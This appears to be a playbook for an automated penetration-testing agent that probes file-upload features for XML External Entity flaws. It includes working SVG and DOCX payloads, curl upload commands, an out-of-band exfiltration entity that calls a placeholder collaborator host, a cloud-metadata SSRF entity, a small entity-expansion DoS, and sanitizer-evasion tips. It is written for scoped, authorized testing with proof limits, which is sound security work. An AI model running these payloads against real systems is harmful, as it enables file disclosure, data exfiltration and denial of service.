---
name: xxe_upload
agent: agent5_injection
description: XXE via SVG/OOXML/XLSX uploads — classic and out-of-band exfiltration, billion-laughs DoS canary, and parser-differential mapping.
---

# XXE via Upload

## Purpose

Finds XML External Entity injection in file-upload features: SVG avatars, Office document imports (DOCX/XLSX), XML config uploads, SVG-to-PNG converters, document previewers. XXE is missed because testers only try uploads on "document" features and never check what the backend parses. Real impact: local file disclosure (`/etc/passwd`, cloud credentials), SSRF via external entities (leading to IMDS), and denial of service via entity expansion. Shares OOB infrastructure with `command_injection`.

## Division of labor

- **Consumes:** upload endpoint inventory from `agent2_mapping` (accepted MIME types, file-size limits), parser hints from `agent1_recon` (Java → Xerces/Saxon; PHP → libxml2; .NET → XmlReader).
- **Produces:** `findings/xxe_upload.md` — per-upload-endpoint verdict table with entity type tested and evidence. Finished artifact; OOB hits coordinate subdomain namespace with `command_injection`.

## When to use / when NOT to use

- **Use when:** the app accepts SVG, XML, DOCX, XLSX, PPTX, or "any document"; features that convert/preview documents; error messages mention XML parsers, `DOCTYPE`, or entity resolution.
- **Skip when (time-pass filter):** uploads are images-only with server-side re-encoding confirmed (upload a PNG, download it back — if metadata/bytes changed, it's re-encoded, but still test SVG separately since SVG is XML); the upload goes straight to object storage with no parsing (verify: does any preview/thumbnail/metadata endpoint touch the file? if nothing parses it, stop); max file size is under 1KB (can't fit a useful payload — note and move on).

## Methodology

1. **Map what gets parsed.** Upload a benign SVG, a benign XML, and (where accepted) a minimal DOCX. For each, check: preview endpoint, thumbnail, metadata extraction (`/api/file/<id>/info`), and error messages. Any of these touching the file = parse surface.
2. **Baseline the parse.** Benign SVG upload → record response, preview rendering, timing. Malformed XML upload → record the error text (parser errors confirm the XML stack: `libxml2`, Xerces, .NET).
3. **Classic inline-entity canary.** Upload SVG with `<!DOCTYPE svg [<!ENTITY xxe "XXE_CANARY_9q">]>` and reference `&xxe;` in a text element. If the preview/metadata/echo contains `XXE_CANARY_9q`, internal entities resolve = XXE context CONFIRMED at the inline level.
4. **Local file read (benign file only).** `<!ENTITY xxe SYSTEM "file:///etc/hostname">` referenced in output. If the hostname appears in a response, you have file disclosure — read ONE benign file (`/etc/hostname`, never credentials) as proof and stop.
5. **Parameter-entity OOB (blind contexts).** When nothing reflects: `<!ENTITY % oob SYSTEM "http://<RANDOM>.oob.<YOUR_DOMAIN>/x"> %oob;` — a DNS/HTTP hit on the unique subdomain = external entity resolution CONFIRMED. Coordinate the subdomain namespace with `command_injection` (prefix `xxe`).
6. **OOB exfiltration canary (one value, then stop).** Parameter entities with a benign value: `<!ENTITY % file SYSTEM "file:///etc/hostname"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<RANDOM>.oob.<YOUR_DOMAIN>/?x=%file;'>">` — if the hostname arrives at the collaborator, exfiltration works. One benign value as proof, then stop. No credential files.
7. **SSRF-via-XXE note.** `<!ENTITY xxe SYSTEM "http://169.254.169.254/">` — do NOT fetch IMDS content. Note the SSRF primitive as reachable and hand to `agent9_chaining` for the human-approved decision.
8. **Billion-laughs DoS canary (careful).** Classic exponential entity expansion — use a SMALL variant (3 levels, tiny expansion) and watch response timing + server behavior. If the server slows or 500s on a small laugh, note DoS potential and STOP. Never run the full billion-laughs payload against a live target.
9. **OOXML path (DOCX/XLSX).** Unzip the file client-side, inject the DOCTYPE/entity into `word/document.xml` (DOCX) or `xl/sharedStrings.xml` (XLSX), re-zip, upload. Many apps parse OOXML with a different (weaker) parser than their SVG path — test both.
10. **SVG-specific vectors.** `xlink:href` with `data:` vs `http:` URLs, `<image>` tags with external references, and SVG `<foreignObject>` — check whether the renderer fetches remote resources (SSRF) even when entities are disabled.
11. **Parser-differential check.** If inline entities are blocked but parameter entities resolve (or vice versa), document the differential — the parser is partially hardened, and the open half is the finding.
12. **Verdict per upload endpoint.** CONFIRMED needs the canary string reflected, the hostname disclosed, or the OOB hit logged. Parser-error-only (step 2) without entity resolution = INCONCLUSIVE, not CONFIRMED.

## Exact commands

Benign + canary SVG pair (save as files, upload via curl):
```bash
cat > benign.svg <<'EOF'
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"><text x="10" y="20">hello</text></svg>
EOF
cat > xxe_inline.svg <<'EOF'
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<!DOCTYPE svg [<!ENTITY xxe "XXE_CANARY_9q">]>
<text x="10" y="20">&xxe;</text>
</svg>
EOF
curl -s -X POST '<TARGET>/api/upload' -F 'file=@benign.svg' -o benign_resp.json; cat benign_resp.json
curl -s -X POST '<TARGET>/api/upload' -F 'file=@xxe_inline.svg' -o xxe_resp.json; cat xxe_resp.json
```

Check every render point for the canary:
```bash
FILE_ID='<ID_FROM_UPLOAD>'
for ep in "/api/file/${FILE_ID}" "/api/file/${FILE_ID}/preview" "/api/file/${FILE_ID}/info" "/api/file/${FILE_ID}/thumbnail"; do
  echo "=== $ep ==="
  curl -s "<TARGET>${ep}" | grep -a -o -m1 'XXE_CANARY_9q' || echo 'no canary'
done
```

Local file read (benign file only):
```bash
cat > xxe_file.svg <<'EOF'
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<text x="10" y="20">&xxe;</text>
</svg>
EOF
curl -s -X POST '<TARGET>/api/upload' -F 'file=@xxe_file.svg'
```

OOB parameter entity (unique subdomain):
```bash
R="xxe$(date +%s%N | md5sum | cut -c1-8)"
cat > xxe_oob.svg <<EOF
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
<!DOCTYPE svg [<!ENTITY % oob SYSTEM "http://${R}.oob.<YOUR_DOMAIN>/x"> %oob;]>
<text x="10" y="20">oob test</text>
</svg>
EOF
curl -s -X POST '<TARGET>/api/upload' -F 'file=@xxe_oob.svg' -o /dev/null
echo "check collaborator for: ${R}.oob.<YOUR_DOMAIN}"
```

OOXML injection (DOCX):
```bash
mkdir -p ooxml && cd ooxml && unzip -q ../template.docx
python3 - <<'EOF'
p='word/document.xml'
s=open(p).read()
s=s.replace('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',
  '<?xml version="1.0"?><!DOCTYPE w:document [<!ENTITY xxe "XXE_CANARY_9q">]>',1)
s=s.replace('<w:t>', '<w:t>&xxe; ',1)
open(p,'w').write(s)
EOF
zip -qr ../xxe.docx * && cd ..
curl -s -X POST '<TARGET>/api/upload' -F 'file=@xxe.docx'
```

Small billion-laughs canary (3 levels only):
```bash
cat > laughs_small.svg <<'EOF'
<!DOCTYPE l [<!ENTITY a "1234567890"><!ENTITY b "&a;&a;&a;"><!ENTITY c "&b;&b;&b;">]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&c;</text></svg>
EOF
curl -s -o /dev/null -w 'laughs-small: %{http_code} %{time_total}s\n' -X POST '<TARGET>/api/upload' -F 'file=@laughs_small.svg'
```

## Parser-differential and XInclude notes

**Inline vs parameter vs external — test all three, they differ per parser:**
- libxml2 (PHP): inline entities usually on, external off by default in modern versions — but `LIBXML_NOENT` flag flips it; the upload path's flag choice is the finding
- Java Xerces: external entities often resolvable unless `disallow-doctype-decl` is set — the DOCTYPE-accept vs DOCTYPE-reject differential (step 2 error mining) predicts this
- .NET XmlReader: `DtdProcessing.Prohibit` (safe) vs `Parse` (vulnerable) — error text mentioning `DtdProcessing` tells you which

**XInclude vector (works even when entities are disabled):**
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include href="file:///etc/hostname" parse="text"/>
</svg>
```
If the hostname renders, XInclude is processed — a separate CONFIRMED finding from entity-based XXE.

**SVG filter evasion (when `<!DOCTYPE` is stripped):**
- UTF-7 encoded payload with `<?xml encoding="UTF-7"?>` — only if the parser honors the declared encoding
- DOCTYPE inside `<defs>` vs document root — some sanitizers strip only the first occurrence
- Split the payload across SVG `<tspan>` elements that concatenate — naive regex sanitizers miss it

**DOCX extended:** also inject into `word/styles.xml` and `[Content_Types].xml` — different parsers handle different OOXML parts, and the preview generator may parse styles while the validator only checks document.xml.

## Completion-bias defenses

- [ ] Every upload endpoint tested, not just the avatar one
- [ ] Benign upload baselined (response, preview, timing) before XXE payloads
- [ ] Inline entity canary checked at ALL render points (preview, info, thumbnail, echo)
- [ ] Local file read limited to /etc/hostname — one benign file, then stop
- [ ] OOB attempted with unique subdomain for every blind-suspect endpoint
- [ ] OOB exfiltration canary limited to one benign value
- [ ] No IMDS fetch — SSRF primitive noted, not exercised
- [ ] Billion-laughs kept to the small canary; full payload never sent
- [ ] OOXML path tested separately from the SVG path
- [ ] Parser differential documented (inline vs parameter entity behavior)
- [ ] `findings/xxe_upload.md` exists with verdict table and raw pairs
- **Review step:** agent10_review must verify (a) the canary/hostname appears in saved responses or the collaborator log shows the exact unique subdomain, (b) no credential file was read, (c) no IMDS request was made, (d) the DoS canary stayed small.
- **Nudge prompts:**
  - "Keep going until every upload endpoint and every render point is checked — the preview endpoint parses differently than the upload endpoint."
  - "One benign file is the proof. Do not read credentials or config files to make the finding 'bigger.'"
  - "Do not report done before findings/xxe_upload.md exists on disk."
- **Finished artifact definition:** `findings/xxe_upload.md` — per-endpoint table (endpoint, file types, entity types tested, verdict, evidence) + raw pairs + collaborator excerpts.

## Evidence standard

- Baseline: benign upload response/preview saved before XXE payloads.
- Reproduction: canary reflection 2x; OOB hit on a unique subdomain (uniqueness = reproduction).
- Raw evidence: upload request, upload response, render-point response showing the canary, collaborator log line.
- Verdicts: CONFIRMED (canary reflected, file disclosed, or OOB hit) / INCONCLUSIVE (parser errors only, no entity resolution) / NEGATIVE (entities stripped at all render points + OOB silent).

## Handoffs

- `agent9_chaining`: consumes CONFIRMED rows — SSRF-via-XXE to IMDS and file-disclosure escalation are human-approved chaining steps.
- `command_injection`: shares OOB collaborator namespace (prefix `xxe` vs `cmdi`).
- `agent10_review`: consumes `findings/xxe_upload.md` — verifies proof boundaries before shipping.
